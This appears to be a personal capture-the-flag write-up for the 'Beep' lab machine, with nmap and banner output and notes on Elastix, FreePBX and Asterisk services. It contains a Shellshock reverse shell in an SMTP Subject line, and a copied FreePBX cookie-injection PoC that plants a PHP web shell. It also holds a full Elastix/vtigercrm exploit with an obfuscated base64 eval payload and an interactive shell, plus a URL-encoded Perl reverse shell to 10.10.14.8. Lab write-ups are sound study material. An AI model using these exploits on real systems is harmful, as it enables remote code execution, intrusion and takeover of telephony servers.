<link href="../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Machine #4<span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

# <span class="title">Beep


<span class="date">Friday, 6/8/2021</span> 


<br/> 

### <span class="helpmach subtitle">Could Be Relevant and Could Be Not  
   * ###  <span class="helpmach subtitle">Nmap
     * Normal Scan  
       ```console
       PORT      STATE SERVICE
       22/tcp    open  ssh
       25/tcp    open  smtp
       80/tcp    open  http
       110/tcp   open  pop3
       111/tcp   open  rpcbind
       143/tcp   open  imap
       443/tcp   open  https
       993/tcp   open  imaps
       995/tcp   open  pop3s
       3306/tcp  open  mysql
       4445/tcp  open  upnotifyp
       10000/tcp open  snet-sensor-mgmt
       ```

     * Extensive Scan

       ```console
       PORT      STATE SERVICE
       22/tcp    open  ssh
       25/tcp    open  smtp
       80/tcp    open  http
       110/tcp   open  pop3
       111/tcp   open  rpcbind
       143/tcp   open  imap
       443/tcp   open  https
       879/tcp   open  unknown
       993/tcp   open  imaps
       995/tcp   open  pop3s
       3306/tcp  open  mysql
       4190/tcp  open  sieve
       4445/tcp  open  upnotifyp
       4559/tcp  open  hylafax
       5038/tcp  open  unknown
       10000/tcp open  snet-sensor-mgmt
       ```

   * ###  <span class="helpmach subtitle">Banner Grabbing
       * Service `sieve p4190`
         ```console
         PORT     STATE SERVICE VERSION
         4190/tcp open  sieve   Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
         ```  
       * Service `mysql p3306`
         ```console
         PORT     STATE SERVICE VERSION
         3306/tcp open  mysql   MySQL (unauthorized)
         |_ssl-cert: ERROR: Script execution failed (use -d to debug)
         |_ssl-date: ERROR: Script execution failed (use -d to debug)
         |_sslv2: ERROR: Script execution failed (use -d to debug)
         |_tls-alpn: ERROR: Script execution failed (use -d to debug)
         |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
         ```

      * `IMAP p143`
         ```console
         PORT    STATE SERVICE VERSION
         143/tcp open  imap    Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
         |_imap-capabilities: Completed MULTIAPPEND ID NO RENAME ATOMIC BINARY ANNOTATEMORE LITERAL+ IMAP4 THREAD=ORDEREDSUBJECT UNSELECT LIST-SUBSCRIBED LISTEXT CONDSTORE OK MAILBOX-REFERRALS QUOTA STARTTLS CATENATE SORT=MODSEQ THREAD=REFERENCES SORT IDLE CHILDREN X-NETSCAPE RIGHTS=kxte NAMESPACE URLAUTHA0001 IMAP4rev1 ACL UIDPLUS
         Service Info: Host: example.com
         ```

      * `smtp p25`  
         ```console
         PORT   STATE SERVICE VERSION
         25/tcp open  smtp    Postfix smtpd
         |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
         Service Info: Host:  beep.localdomain
         ``` 
      * `pop3 p110`
         ```console
         PORT    STATE SERVICE VERSION
         110/tcp open  pop3    Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
         |_pop3-capabilities: APOP STLS PIPELINING RESP-CODES LOGIN-DELAY(0) AUTH-RESP-CODE IMPLEMENTATION(Cyrus POP3 server v2) EXPIRE(NEVER) USER UIDL TOP
         Service Info: Host: example.com
         ```       

      * `p5038`
         ```console
         PORT     STATE SERVICE  VERSION
         5038/tcp open  asterisk Asterisk Call Manager 1.1
         ``` 
      * `p879`
         ```console
         PORT    STATE SERVICE VERSION
         879/tcp open  status  1 (RPC #100024)
         ```    
         * This port is for the rpcbind service.  
          
      * `hylafax p4559`   
         ```console
         PORT     STATE SERVICE VERSION
         4559/tcp open  hylafax HylaFAX 4.3.10
         Service Info: Host: localhost; OS: Unix
         ```
      * `rpcbind p111`
         ```console
         PORT    STATE SERVICE VERSION
         111/tcp open  rpcbind 2 (RPC #100000)
         | rpcinfo: 
         |   program version    port/proto  service
         |   100000  2            111/tcp   rpcbind
         |   100000  2            111/udp   rpcbind
         |   100024  1            876/udp   status
         |_  100024  1            879/tcp   status
         ``` 
      * `webmin p10000`
         ```console
         PORT      STATE SERVICE VERSION
         10000/tcp open  http    MiniServ 1.570 (Webmin httpd)
         |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
         ``` 
      * `imaps p993` 
         ```
         PORT    STATE SERVICE  VERSION
         993/tcp open  ssl/imap Cyrus imapd
         |_imap-capabilities: CAPABILITY
         ```

   * ###  <span class="helpmach subtitle">Searchsploiting Shit      
     * to view the script of the exploit write the following `searchsploit -x [PATH TO SCRIPT]`.
     * Searchsploiting `webmin 1.570`

<br/><br/> 

### <span class="helpmach subtitle">Useful Info
   * I will start with the http service.
   * `Cookie: elastixSession=58cepcv54igih0lmia2r61mih6` this cookie gets sent with each request to the http and https.
   * The same cookie is being sent with the request however it was.
   * What is a ShellShock?
     In layman’s terms, Shellshock is a vulnerability that allows systems containing a vulnerable version of Bash to be exploited to execute commands with higher privileges. 
   * Apache version `Apache/2.2.3 (CentOS) Server at 10.10.10.7 Port 443`.
   * some thing I got when I nced the pop port 
       ```
       nc -nv 10.10.10.7 110 
       (UNKNOWN) [10.10.10.7] 110 (pop3) open
       +OK example.com Cyrus POP3 v2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 server ready <818982514.1628267758@example.com>
       ```
   * gobustered the http and didn't find anything.
   * `Cookie: elastixSession=58cepcv54igih0lmia2r61mih6; UICSESSION=b8s0blic6oetuiehaqeubl0rf1; UIADMINSESSION=6motkiqumpc7e0pj2hbk8jebs0; UIAGENTSESSION=orgkejeebra8tvdequddat0j84` includes the following cookies when I first opened the http service. 
   * send => mail from:<3mrgnc3>\r\n
   * rcpt to:<4029080524.1628350666@example.com>\r\n 
   * data\r\n
To:<4029080524.1628350666@example.com>
From<4029080524.1628350666@example.com>
Subject:() { :; };nc -nv 10.10.14.8 1234 -e /bin/bash
love from flowers
.

quit

   * Another email I found: 4029080524.1628350666@example.com
   * support@beep.localdomain
   * USER  90
### <span class="helpmach subtitle">Why I Got Stuck?  
<br/><br/>

### <span class="helpmach subtitle">Nice Things I Found in Someone Else's Write Up  

Exploit Title: Freepbx cookie recordings injection
Google Dork: Ask Santa
Date: 23/12/2016
Exploit Author: inj3ctor3
Vendor Homepage: https://www.freepbx.org/
Software Link: ISO LINKS IN SITE https://www.freepbx.org/
Version: ALL && unpatched/ (Trixbox/freepbx/elastix/pbxinflash/)
Tested on: Centos 6
CVE : CVE-2014-7235

1. Description

a critical Zero-Day Remote Code Execution and Privilege Escalation 
exploit within the legacy <E2><80><9C>FreePBX ARI Framework module/Asterisk 
Recording Interface (ARI)<E2><80><9D>.
htdocs_ari/includes/login.php in the ARI Framework module/Asterisk Recording Interface (ARI) in FreePBX before 2.9.0.9, 2.10.x, 
and 2.11 before 2.11.1.5 allows remote attackers to execute arbitrary code via the ari_auth coockie, 
related to the PHP unserialize function

<?php
.....
...
line 56 $buf = unserialize(stripslashes($_COOKIE['ari_auth']));
 line 57 list($data,$chksum) = $buf;
....
?>

A successful attack may compromise the whole system aiding the hacker to gain

further privileges via taking advantage of famous nmap shell 

without further or do this is a poc code

curl -ks   --cookie "ari_lang=() { :;};php -r 'set_time_limit(0);unlink(\"page.framework.php\");file_put_contents("misc/audio.php", "<?php if(\$_COOKIE[\"lang\"]) {system(\$_COOKIE[\"lang\"]);}die();?>");';ari_auth=O:8:"DB_mysql":6:{s:19:"_default_error_mode";i:16;s:22:"_default_error_options";s:9:"do_reload";s:12:"_error_class";s:4:"TEST";s:13:"was_connected";b:1;s:7:"options";s:3:"123";s:3:"dsn";a:4:{s:8:"hostspec";s:9:"localhost";s:8:"username";s:4:"root";s:8:"password";s:0:"";s:8:"database";s:7:"trigger";}};


elastixSession=716ratk092555gl0b3gtvt8fo7;UICSESSION=rporp4c88hg63sipssop3kdmn2;ARI=b8e4h6vfg0jouquhkcblsouhk0" --data "username=admin&password=admin&submit=btnSubmit" >/dev/null http://10.10.10.7/recordings/index.php

if curl -ks -m10 "http://10.10.10.7/recordings/misc/audio.php" --cookie "lang=id" | grep asterisk >/dev/null;then echo "127.0.0.1/recordings/misc/audio.php" | tee -a xploited_new.txt;fi


Versions
```
Kernel
   Linux(i386)-2.6.18-238.12.1.el5

 Elastix
   elastix-2.2.0-14
   elastix-firstboot-2.2.0-5
   elastix-system-2.2.0-14
   elastix-email_admin-2.2.0-9
   elastix-vtigercrm-5.1.0-8
   elastix-extras-2.0.4-4
   elastix-asterisk-sounds-1.2.3-1
   elastix-my_extension-2.2.0-5
   elastix-agenda-2.2.0-5
   elastix-a2billing-1.8.1-16
   elastix-addons-2.2.0-4
   elastix-im-2.0.4-2
   elastix-pbx-2.2.0-14
   elastix-pr-2.0-2
   elastix-security-2.2.0-7
   elastix-reports-2.2.0-6
   elastix-fax-2.2.0-4

 RounCubeMail
   RoundCubeMail-0.3.1-10

 Mail
   postfix-2.3.3-2.3.el5_6
   cyrus-imapd-2.3.7-7.el5_6.4

 IM
   openfire-3.5.1-2

 FreePBX
   freePBX-2.8.1-7

 Asterisk
   asterisk-1.8.7.0-0
   asterisk-perl-0.10-2
   asterisk-addons-1.8.7.0-0

 FAX
   hylafax-4.3.10-2rhel5
   iaxmodem-1.2.0-1.1

 DRIVERS
   dahdi-2.4.1.2-5
   rhino-0.99.4-2.rc1
   wanpipe-util-3.5.23-1
```




```php
<?
echo "\n+-------------------------------------------+\n";
echo "|              Elastix <= 2.4               |\n";
echo "|         PHP Code Injection Exploit        |\n";
echo "|                  By i-Hmx                 |\n";
echo "|                sec4ever.com               |\n";
echo "|             n0p1337@gmail.com             |\n";
echo "+-------------------------------------------+\n";
echo "\n| Enter Target [https://ip] # ";
$target=trim(fgets(STDIN));
$inj='<?eval(base64_decode("JGY9Zm9wZW4oJ2ZhcnNhd3kucGhwJywndysnKTskZGF0YT0nPD8gaWYoISRfUE9TVFtwd2RdKXtleGl0KCk7fSBlY2hvICJGYXJpcyBvbiB0aGUgbWljIDpEPGJ
yPi0tLS0tLS0tLS0tLS0tLS0tIjtAZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFtmYV0pKTtlY2hvICItLS0tLS0tLS0tLS0tLS0tLSI7ID8+Jztmd3JpdGUoJGYsJGRhdGEpO2VjaG8gImRvbmUiOw
o="));
?>';
$faf=fopen("fa.txt","w+");
fwrite($faf,$inj);
fclose($faf);
$myf='fa.txt';
$url =
$target."/vtigercrm/phprint.php?action=fa&module=ff&lang_crm=../../modules/Import/ImportStep2.php%00";
// URL
$reffer = "http://1337s.cc/index.php";
$agent = "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.4)
Gecko/20030624 Netscape/7.1 (ax)";
$cookie_file_path = "/";
echo "| Injecting 1st payload\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $agent);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,array("userfile"=>"@".realpath($myf))); //userfile:/path/to/the/file/fa.txt
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, $agent);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,array("userfile"=>"@".realpath($myf)));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_REFERER, $reffer);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file_path);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file_path);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$result = curl_exec($ch);
curl_close($ch);
//echo $result;
echo "| Injecting 2nd payload\n";
function faget($url,$post){
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl, CURLOPT_POSTFIELDS,$post);
curl_setopt($curl, CURLOPT_COOKIEFILE, '/');
curl_setopt($curl, CURLOPT_COOKIEJAR, '/');
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,0);
curl_setopt($curl,CURLOPT_TIMEOUT,20);
curl_setopt($curl, CURLOPT_HEADER, true);
$exec=curl_exec($curl);
curl_close($curl);
return $exec;
}
function kastr($string, $start, $end){
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
}
$me=faget($target."/vtigercrm/phprint.php?action=fa&module=ff&lang_crm=../../cache/import/IMPORT_%00","");
echo "| Testing total payload\n";
$total=faget($target."/vtigercrm/farsawy.php","pwd=1337");
if(!eregi("Faris on the mic :D",$total))
{
die("[+] Exploitation Failed\n");
}
echo "| Sending CMD test package\n";
$cmd=faget($target."/vtigercrm/farsawy.php","pwd=1337&fa=cGFzc3RocnUoJ2VjaG8gZmFyc2F3eScpOw==");
if(!eregi("farsawy",$cmd))
{
echo "   + Cmd couldn't executed but we can evaluate php code\n   + use :
$target//vtigercrm/fa.php\n   Post : fa=base64code\n";
}
echo "| sec4ever shell online ;)\n\n";
$host=str_replace('https://','',$target);
while(1){
echo "i-Hmx@$host# ";
$c=trim(fgets(STDIN));
if($c=='exit'){die("[+] Terminating\n");}
$payload=base64_encode("passthru('$c');");
$fuck=faget($target."/vtigercrm/farsawy.php","pwd=1337&fa=$payload");
$done=kastr($fuck,"-----------------","-----------------");
echo "$done\n";
}
/*
I dont even remember when i exploited this shit!
maybe on 2013?!
whatever , Hope its not sold as 0day in the near future xDD
*/
?>

```


a user name ==> Fanis Papafanopoulos

https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.8%3a1234%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A


* events (Put path option).
* Rewards (Free courses, bookshop(buy one get one free), free meal from a restaurant, cake shop)